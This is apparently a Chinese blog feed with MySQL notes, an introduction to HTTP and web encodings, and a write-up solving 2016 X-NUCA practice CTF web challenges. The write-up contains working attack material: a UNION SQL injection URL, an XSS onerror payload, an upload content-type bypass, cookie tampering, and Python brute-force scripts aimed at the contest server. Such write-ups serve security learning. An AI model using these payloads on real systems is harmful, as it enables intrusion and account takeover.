<p>NULL与空字符串“‘’”是两个不同的概念。<br>NULL与整数零以及空格字符“‘ ’”的概念也不同。</p>
<p>MyISAM表的备份只需将整个数据库目录复制一份即可。<br>InnoDB表的备份不仅需要复制整个数据库目录，还需要复制ibdata1表空间文件，以及重做日志文件ib_lagfile1。</p>
<h2><span id="innodb-表空间">InnoDB 表空间</span></h2><p>InnoDB表空间分为共享表空间与独享表空间。</p>
<h3><span id="共享表空间">共享表空间</span></h3><p>MySQL服务实例承载的所有数据库的所有InnoDB表的数据信息、索引信息、各种元数据信息以及事务的回滚（UNDO）信息，全部存放在共享空间文件中。</p>
<h3><span id="独享表空间">独享表空间</span></h3><p>如果将全局变量innodb_file_per_table的值设置为ON，那么之后创建InnoDB存储引擎的新表时，这些表的数据信息、索引信息将保存到独享表空间中。</p>
<h2><span id="删除表">删除表</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用SQL语句“drop table table_name;&quot;即可删除名为table_name的表</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Web安全与攻击技术-基础知识]]></title>
      <url>https://uknowsec.cn/posts/notes/Web%E5%AE%89%E5%85%A8%E4%B8%8E%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h1><span id="基础知识">基础知识</span></h1><h2><span id="0x01-http协议">0x01 HTTP协议</span></h2><p>超文本传送协议（Hypertext Transport Protocol , HTTP）是分布式、协作式、超媒体系统应用之间的通信协议，是万维网（World Wide Web）交换信息的基础。HTTP是一个客户端终端（用户）和服务端（网站）请求和应答的标准（TCP）。通过使用Web浏览器、网络爬虫或者其他工具，客户端发起一个HTTP请求到服务器上指定端口（默认端口为80），称这个客户端为用户代理程序。通常，有HTTP客户端发起一个请求，创建一个到服务器指定端口（默认端口为80端口）的TCP连接。HTTO服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，如“HTTP/1.1 200 OK”及返回的内容（请求的文件、错误信息、或者其他信息）。</p>
<h3><span id="http方法">HTTP方法</span></h3><p>（1）OPTIONS：该办法可使服务器传回该资源所支持的所有HTTP请求方法。用‘*’来代替资源名称，向Web服务器发送OPTIONS请求，可以测试服务器功能是否正常运作。<br>（2）HEAD:与GET方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）<br>（3）GET:向指定资源发出“显示”请求。使用GET方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，如在Web Application中，其中一个原因就是GET可能会被网络蜘蛛等随意访问。<br>（4）POST:向指定资源提交数据，请求服务器进行处理（如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。<br>（5）PUT：向指向资源位置上传其最新内容。<br>（6）DELETE：请求服务器删除Request-URI所标识的资源。<br>（7）TRACE：回显服务器收到的请求，主要用于测试或诊断。<br>（8）CONNECT:HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的HTTP代理服务器）。<br>以下是一个典型的HTTP GET 请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/4.0(compatible; MSIE 8.0; Windows NT 6.0)</span><br><span class="line">Host: www.bit.edu.cn</span><br><span class="line">Accept: text/html</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Accept-Rncoding: gzip,deflate</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Cookie: SessionId= ICONFPDBEPOBLFFGBKKNCGAL</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure></p>
<p>其中，请求的第一行都是由3个以空格间隔的项目组成，分别是请求方法、请求路径、和HTTP版本。其他一些常见的消息头如下。<br>（1）Referer消息头用于表示发出请求的原始URL。<br>（2）User-Agent消息头提供与浏览器或其他请求的客户端软件有关的信息。<br>（3）Host消息头用于指定出现被访问的完整URL中的主机名称。<br>（4）Cookie消息头用于提交服务器向客户端发布的其他参数。</p>
<h3><span id="http-状态码">HTTP 状态码</span></h3><p>HTTP状态码（HTTP Status Code）是用以表示网页服务器HTTP响应状态的3位柱子代码。所有HTTP响应的第一行都是状态行，以次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。<br>状态代码的第一数字代表当前响应的类型。<br>（1）1xx消息————请求已被服务器接收，继续处理。<br>（2）2xx成功————请求已成功被服务器接收、理解、并接受。<br>（3）3xx重定向————需要后续操作才能完成这一请求。<br>（4）4xx请求错误————请求含有词法错误或者无法被执行。<br>（5）5xx服务器错误————服务器在处理某个正确请求时发生错误。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Date: Mon,04 Mar 2013 07:53:16 GMT</span><br><span class="line">Server: Apache/2.2.23 (Unix) mod_jk/1.2.14</span><br><span class="line">Content-Length: 31300</span><br><span class="line">Keep-Alive: timeout=5,max=99</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text-html</span><br></pre></td></tr></table></figure></p>
<p>每个HTTP响应的第一行由3个以空格间隔的项目组成，分别为HTTP版本、状态码和原因短语。其他一些常见的消息头如下：<br>（1）Server消息头包含一个旗标，指明所使用的Web服务器软件。有时还包括其他信息，如所安装的模块和服务器操作系统。其中包括的信息可能并不准确。<br>（2）Set-Cookie消息头向浏览器发送另一个Cookie,它将在最后向服务器发送的请求中由Cookie消息头返回。<br>（3）Progma消息头指示浏览器是否将响应保存在缓存中。<br>（4）Expires消息头指出响应内容过期日期。<br>（5）Content-Length消息头规定消息主题的字节长度。<br>（6）Content-Type消息头表示这个消息主题中包含一个HTML文档。</p>
<h3><span id="http-cookie">HTTP Cookie</span></h3><p>HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。所以Cookie就是用来绕开HTTO的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含的信息，借此维护用户跟服务器会话中的状态。</p>
<h3><span id="https">HTTPS</span></h3><p>超文本传输安全协议（Hypertext Transfer Protocol Secure, HTTPS）是超文本传输协议和SSL/TLS的组合，用以提供加密通信及对网络服务器身份的鉴定。HTTPS连接经常被用于万维网上的交易支付和企业信息系统的敏感信息的传输。<br>HTTPS可为浏览器和服务器间传输的数据提供机密性与完整性保护功能。有助于防止信息泄漏，并且可以保证用户处理的服务器的安全性。但是HTTPS并不能抵御直接针对某个应用程序服务器或客户端组件的攻击，而许多成功的攻击都属于这种类型。因此无论服务器是否使用HTTPS，大多数Web应用程序安全漏洞仍然存在。</p>
<h2><span id="0x02-bs功能及会话">0x02 B/S功能及会话</span></h2><h3><span id="服务端功能">服务端功能</span></h3><p>Web应用程序主要向用户提供动态生成的内容。当用户请求一个动态资源时，服务器会建立响应并在服务器端执行相应的脚本生成内容，然后将内容返回给用户。在形式上服务器类似于计算机程序，接受输入并处理输入，最后向用户返回输出结果。<br>HTTP请求通常使用以下3种方式向应用程序传递参数。<br>（1）通过URL里的查询字符串。<br>（2）通过在请求主题中使用POST方法。<br>（3）通过HTTP Cookie。</p>
<h3><span id="客户端功能">客户端功能</span></h3><p>服务器端应用程序要接收用户输入与操作，并向用户返回其结果，它必须提供一个客户端界面。由于所有的Web应用都通过Web浏览器访问，因此这些界面共享一个技术核心。近些年来客户端技术不断发生变化，以下介绍一些常见的客户端技术。</p>
<h4><span id="html">HTML</span></h4><p>超文本标记语言（Hyper Text Markup Language, HTML）是为“网页创建和其他可在网页浏览器中看到的信息”设计的一种标记语言。<br>超链接是HTML中常见的一个标签，事实上服务器与客户端之间大量的通信都由用户单击超链接驱动。<br>虽然超链接具有极大的方便性，但许多Web程序还需要采用更灵活的形式收集输入，HTML表单是一种常见的机制，它允许用户提交任意的输入。</p>
<h4><span id="css">CSS</span></h4><p>层叠样式表（Cascading Style Sheets）,又称串样式列表，一种用来为结构化文档（如HTML文档或XML应用）添加样式（字体、间距和颜色等）的计算机语言，由W3C定义和维护。CSS目前最新版本为CSS3,是能够真正做到网页表现与内容分离的一种样式是设计语言。相对于传统HTML的表现而言，CSS能够对网页中的对象的位置排版进行像素级的精髓控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力，并能够进行初步交互涉及，是目前基于文本展示最优秀的表现设计语言。CSS能够根据不同使用者的理解能力，简化或者优化写法，针对各类人群，有较强的易读性。</p>
<h4><span id="javascript">JavaScript</span></h4><p>JavaScript是一种由Netscape的LiveScript发展而来的原型化继承的面向对象的动态类型的区分大小写的客户端脚本语言，主要目的是为了解决服务器端语言，例如，Perl遗留的速度问题，为客户提供更流畅的浏览效果。<br>JavaScript是一种相对简单但功能强大的编程语言，使用它可以方便地以各种仅使用HTML无法实现的方法对Web界面进行扩展。JavaScript常用于执行以下任务。<br>（1）确定用户输入，然后将其提交给服务器避免数据包含错误而提交不必要的请求。<br>（2）根据用户的输入动态修改用户界面，以减少客户端与服务器端通信次数。<br>（3）查询并更新浏览器内的文档对象模型（Document Object Model, DOM）,控制浏览器行为。</p>
<h4><span id="浏览器扩展技术">浏览器扩展技术</span></h4><p>除了JavaScript技术外，一些Web应用程序还使用浏览器扩展技术，使用定制代码从各个方面扩展浏览器的内置功能。这些扩展可通过适当的浏览器执行或需要在客户端安装可执行程序。以下列出常见的一些后客户端技术。<br>（1）Java applet<br>（2）ActiveX控件<br>（3）Flash对象<br>（4）Silverlight对象</p>
<h3><span id="状态与会话">状态与会话</span></h3><p>HTTP协议本身是无状态的，客户端只需简单地想服务器请求，服务器响应请求返回响应消息。无论是客户端还是服务器都没有记录信息，每一次请求都是独立的。随着Web应用的发展，按需生成动态信息变得越来越重要。其中，Cookie就是为了解决HTTP无状态的而产生的，后来又出现Session，一种在客户端和服务器端保持状态的解决方案。<br>Session基址是一种服务器机制，服务器一般采用类似于散列表的存储结构保存信息。<br>与Cookie机制不同的是，Session采取的是在服务器端保持状态，而Cookie是在客户端保持状态。同时，服务器端需要在客户端保存一个标识。所以Session机制通常需要借助于Cookie来保存Session标识。</p>
<h2><span id="编码格式">编码格式</span></h2><h3><span id="url-编码">URL 编码</span></h3><p>统一资源定位符（Uniform/Universal Resource Locator）也被称为网页地址，如同在网络上的门牌，是因特网上标准的资源的地址（Address）。它最初由蒂姆·伯纳斯·李发明用来作为万维网的地址。现在它已经被万维网联盟编制为因特网标准RFC1738。<br>在因特网的历史上，统一资源定位符的发明是一个非常基础的步骤。统一资源定位符的语法是一般的、可扩展的，它使用ASCII代码的一部分来表示因特网的地址。统一资源定位符的开始，一般会标志着一个计算机网络所使用的网络协议。<br>统一资源定位符的标准格式如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">协议类型：//服务器地址（必要时要加上端口号）/路径/文件名</span><br></pre></td></tr></table></figure></p>
<p>URL只允许使用US-ASCII字符集中的可打印字符（ASCII代码在0x20~0x7e范围内）。而且由于其在URL方案或HTTP协议内具有特殊含义，这个范围内的一些字符也不能在URL中使用。URL编码方案对扩展ASCII字符集中的任何有问题的字符进行编码，使其可以通过HTTP安全传输。任何URL编码的字符都是以%为前缀，其后是这个字符的两位十六进制ASCII代码。</p>
<h3><span id="unicode-编码">Unicode 编码</span></h3><p>Unicode是一种为支持全世界所使用的各种编码系统而设计的字符编码标准，它采用各种编码方案，其中一些可用于表示Web应用程序中不常见的字符。<br>16位Unicode编码的工作原理与URL编码类似。为通过HTTP进行传输，16位Unicode编码的字符以%u为前缀，其后是这个字符的十六进制Unicode码点。</p>
<h3><span id="html-编码">HTML 编码</span></h3><p>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案。许多字符在HTML中具有特殊含义（如HTML元字符），并被用于定义文档结构而非其内容。为了安全使用这些字符，并将其用在文档的内容中，就必须对其进行HTML编码。<br>当攻击Web应用程序时，HTML编码主要在探查跨站脚本漏洞时发挥作用。</p>
<h3><span id="base64-编码">Base64 编码</span></h3><p>Base64是一种基于64个可打印字符来表示二进制数据的表示方法。由于2的6次方等于64，所以每6个位元为一个单元，对应某个可打印字符。三个字节有24个位元，对应于4个Base64单元，即3个字节需要用4个可打印字符来表示。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。<br>如果最后的输入数据块不能构成3段输出数据，就用一个或两个等号补足输出。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[ 2016年X-NUCA全国高校网安联赛--赛前指导练习题web进阶篇Writeup ]]></title>
      <url>https://uknowsec.cn/posts/ctf/2016%E5%B9%B4X-NUCA%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC%E7%BB%83%E4%B9%A0%E9%A2%98web%E8%BF%9B%E9%98%B6%E7%AF%87Writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="0x00-前言">0x00 前言</span></h2><p>第一次写Writeup，尝试一下吧！</p>
<h2><span id="0x01-正文">0x01 正文</span></h2><h3><span id="捉迷藏">捉迷藏</span></h3><h4><span id="题目">题目</span></h4><p>捉迷藏<br>描述：从页面中找到隐藏的flag<br><a href="http://218.76.35.75:20111" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%871.png" alt=""><br>F12审查元素发现有一个Index.php的链接，把背景去掉。点击链接得到flag</p>
<h4><span id="flag">Flag</span></h4><p>flag{th!5!5n0tth3fl@g}</p>
<h3><span id="简单问答">简单问答</span></h3><h4><span id="题目">题目</span></h4><p>简单问答<br>描述：这几个小问题实在是太简单了，相信你一定能获得满分<br><a href="http://218.76.35.75:20112" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>审查元素将按钮键的disabled改为abled。<br>利用burpsuite抓取数据包，修改参数提交得到flag<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%872.png" alt=""><br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%873.png" alt=""></p>
<h4><span id="flag">Flag</span></h4><p>flag{W3ll_d0n3}</p>
<h3><span id="后台后台后台">后台后台后台</span></h3><h4><span id="题目">题目</span></h4><p>后台后台后台<br>描述：登录这个网站很容易，请进入后台寻找flag<br><a href="http://218.76.35.75:20113" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>利用burpsuite抓取数据包，把cookie中的Member参数修改为Admin的base64的编码，得到flag.<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%875.png" alt=""></p>
<h4><span id="flag">Flag</span></h4><p>flag{C00ki3_n0m_n0m_n0m}</p>
<h3><span id="php是最好的语言">php是最好的语言</span></h3><h4><span id="题目">题目</span></h4><p>php是最好的语言<br>描述：据说php是最好的语言，perfect？来试试看<br><a href="http://218.76.35.75:20114" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017f&quot;,&quot;bar2&quot;:[[1,1],1,1,1,1]&#125;&amp;cat[0]=123&amp;cat[1][]=1&amp;dog=%00htctf2016</span><br></pre></td></tr></table></figure></p>
<h4><span id="flag">Flag</span></h4><p>flag{php_i5_n0t_b4d}</p>
<h3><span id="忘记密码了">忘记密码了</span></h3><h4><span id="题目">题目</span></h4><p>忘记密码了<br>描述：在这个网站，记录了小伙伴们的密码。 可是slash的密码怎么也找不到了，你能帮忙找出来么<br><a href="http://218.76.35.75:20115/" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>把bob和sam的MD5解出来分别是bob317和sam429,利用脚本爆破密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line">url=&quot;http://218.76.35.75:20115/index.php&quot;</span><br><span class="line">for i in xrange(1000):</span><br><span class="line"></span><br><span class="line">    header=&#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0&quot;&#125;</span><br><span class="line"></span><br><span class="line">    param=hashlib.md5(&quot;slash&quot;+str(i)).hexdigest()</span><br><span class="line"></span><br><span class="line">    tmpurl=url+&quot;?page=&quot;+param</span><br><span class="line"></span><br><span class="line">    print tmpurl</span><br><span class="line"></span><br><span class="line">    result=r.get(tmpurl,headers=header)</span><br><span class="line"></span><br><span class="line">    content=result.content</span><br><span class="line"></span><br><span class="line">    if &apos;flag&apos; in content or &apos;Flag&apos; in content or &apos;FLAG&apos; in content:</span><br><span class="line"></span><br><span class="line">        print content</span><br><span class="line"></span><br><span class="line">        print i</span><br><span class="line"></span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
<p>得到结果<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%876.png" alt=""></p>
<h4><span id="flag">Flag</span></h4><p>flag{n1ce_te4m_n1ce_Rock}</p>
<h3><span id="php是最好的语言">php是最好的语言</span></h3><h4><span id="题目">题目</span></h4><p>http 头注入<br>描述：换个浏览器试试？</p>
<p><a href="http://218.76.35.75:20121" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>抓包得到数据包，Referer处加*号。sqlmap -r xx.txt。得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /heetian.php HTTP/1.1</span><br><span class="line">Host: 218.76.35.75:20121</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://www.google.com/search?hl=en&amp;q=*</span><br><span class="line">Cookie: PHPSESSID=gr7gtgjm8v0q5a9j3ampntgmp0; User=JohnTan101; Member=Tm9ybWFs</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p>
<h4><span id="flag">Flag</span></h4><p>flag{Y0ugetT82f00000laev}</p>
<h3><span id="简单的文件上传">简单的文件上传</span></h3><h4><span id="题目">题目</span></h4><p>简单的文件上传<br>描述：上传php 文件就给你flag<br><a href="http://218.76.35.75:20122/" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>上传一个php文件，抓包将Content-Type改为 image/jpeg上传，得到flag.<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%877.png" alt=""></p>
<h4><span id="flag">Flag</span></h4><p>flag{Upl00d30668ss9h97aFil3}</p>
<h3><span id="简单的js">简单的JS</span></h3><h4><span id="题目">题目</span></h4><p>简单的JS<br>描述：执行后的结果就是flag 的url<br><a href="http://218.76.35.75:20123/" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>打开解题链接</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%878.png" alt=""></p>
<p>还有一个明显提示 evilurl is flag </p>
<p>看不出什么其他的，直接查看源码</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%879.png" alt=""></p>
<p>在这里可以看到定义一个p，eval以后写到页面，但是好像并没有输出什么，猜测可能这里没有执行成功，JS 问题可以直接查看控制台</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8710.png" alt=""></p>
<p>可以看到报语法错误，</p>
<p>我们把这个语句copy下来，自己调试好</p>
<p>没修改之前，明显的有报错</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8711.png" alt=""></p>
<p>我们把它第二行的空格和第一行的换行符删掉，然后执行eval，看下P 到底是什么</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8712.png" alt=""></p>
<p>题目提示执行后的结果就是flag的url</p>
<p>访问这个url试试</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8713.png" alt=""></p>
<p>页面没有输出什么，再抓包看看</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8714.png" alt=""></p>
<p>可以看到flag已经写在cookie里了。</p>
<h4><span id="flag">Flag</span></h4><p>flag{COOk1els60SecU5e}</p>
<h3><span id="试试xss">试试xss</span></h3><h4><span id="题目">题目</span></h4><p>描述：alert document.domain</p>
<p><a href="http://218.76.35.75:20125/" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>打开就一个输入框，输入字母啥的没啥反应。。。。</p>
<p>被谁吃了。。。</p>
<p>既然提示xss，就试试特殊符号吧，比如“&lt;&gt;”</p>
<p>加个’的时候，多了一个img标签，什么鬼。。。。。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8715.png" alt=""></p>
<p>当我输入’aaaaaaaaaaaa的时候。。。。</p>
<p>aaaaaaaaaaaa居然直接成了img的一个属性名，可怕。。。。</p>
<p>这样就简单了，瞬间就想到onerror，既然hint 是alertdocument.domain，那就用这个吧</p>
<p>直接’ onerror=alert(document.domain)这样不就可以了，试试先。。。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8716.png" alt=""></p>
<p>居然没弹出来。。。。</p>
<p>为什么！！！！！</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8717.png" alt=""></p>
<p>查看下源码。。。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8718.png" alt=""></p>
<p>至少知道了我们输入的内容并没有被实体编码。。。</p>
<p>但是onerror事件没有发生，就说明img标签的src并没有出错。。。</p>
<p>再看看刚才我们输入的内容</p>
<p>onerror=alert(document.domain)</p>
<p>如果在’前面加一个不存在的路径，那后面的onerror事件不就可以出发了么。。。</p>
<p>试试再说。。。。</p>
<p>输入heetian.jpg’ onerror=alert(document.domain)</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8719.png" alt=""></p>
<p>终于出来了。。。</p>
<h4><span id="flag">Flag</span></h4><p>flag{D0Gum6Ntd0M11n}</p>
<h3><span id="简单的文件包含">简单的文件包含</span></h3><h4><span id="题目">题目</span></h4><p>简单的文件包含<br>描述：Flag 在/flag<br><a href="http://218.76.35.75:20126/" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>打开解题链接，可以看到4个超链接，然后就没有然后了。。。</p>
<p>一个一个访问看看。。。。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8720.png" alt=""></p>
<p>考过3级（没考过）的渣渣表示看不懂</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8721.png" alt=""></p>
<p>其他链接也是如此，就只有一句英文的名言(看起来似乎是名言… 我也不知道是不是，知道的告诉我下…，先谢谢了…)。。。。</p>
<p>抓包也没看到什么可疑的东西</p>
<p>再看看题目提示吧，没准就有就用。。。</p>
<p>标题是文件包含，也说了flag的位置。。。</p>
<p>再回来看看前面的4个超链接</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8722.png" alt=""></p>
<p>这种url形式的，看起来有点像是文件包含，直接修改page值为/flag 看看</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8723.png" alt=""></p>
<p>居然不在这里。。。提示又说在/flag ，可以试试多加几个../../../../../试试~~~~</p>
<p>不过在这之前还是先查看源码和响应包吧….</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8724.png" alt=""></p>
<p>有注释。。。</p>
<p>访问这个页面。。。得到flag。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8725.png" alt=""></p>
<h4><span id="flag">Flag</span></h4><p>flag{F11elNcLud3Get}</p>
<h3><span id="简单的验证">简单的验证</span></h3><h4><span id="题目">题目</span></h4><p>简单的验证<br>描述：你不是amdin，没有权限查看flag<br><a href="http://218.76.35.75:20127" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>和题目5差不多，把cookie里面user改成admin之后，爆破guess值，最后是573<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">r=requests.session()</span><br><span class="line"></span><br><span class="line">url=&quot;http://218.76.35.75:20127/index.php&quot;</span><br><span class="line">for i in xrange(1000,0,-1):</span><br><span class="line"></span><br><span class="line">    header=&#123;&quot;Cookie&quot;:&quot;user=admin;guess=&quot;+str(i)&#125;</span><br><span class="line"></span><br><span class="line">    print header</span><br><span class="line"></span><br><span class="line">    result=r.get(url,headers=header)</span><br><span class="line"></span><br><span class="line">    content=result.content</span><br><span class="line"></span><br><span class="line">    if &apos;flag&apos; in content or &apos;Flag&apos; in content or &apos;FLAG&apos; in content:</span><br><span class="line"></span><br><span class="line">        print content</span><br><span class="line"></span><br><span class="line">        print i</span><br><span class="line"></span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
<p>运行结果<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E5%9B%BE%E7%89%8726.png" alt=""></p>
<h4><span id="flag">Flag</span></h4><p>flag{EaSy70Ch1ngG00kie}</p>
<h3><span id="注入那么简单">注入那么简单</span></h3><h4><span id="题目">题目</span></h4><p>注入那么简单<br>描述：注入、猜表、拿分，就是这么简单<br><a href="http://218.76.35.75:20101" target="_blank" rel="noopener">题目链接</a></p>
<h4><span id="解题思路">解题思路</span></h4><p>题目要求是注入，可输入的参数为name </p>
<p>首先尝试name=guest 存在返回。</p>
<p>再次尝试name=guest’or’1’=’1,返回3列，说明没有做过多的过滤，这里，我们尝试用order by 来获得列。</p>
<p>Name=guest’order by 1 %23 有返回，依次递增数字到4时报错，说明有3列。</p>
<p>题目提示，说要猜表，构造如下语句，来获得flag</p>
<p><a href="http://218.76.35.75:20101/?name=guest%27union%20select%201,flag,3%20from%20flag%23" target="_blank" rel="noopener">http://218.76.35.75:20101/?name=guest%27union%20select%201,flag,3%20from%20flag%23</a></p>
<h4><span id="flag">Flag</span></h4><p>flag{thisisforunionsqlinjection}</p>
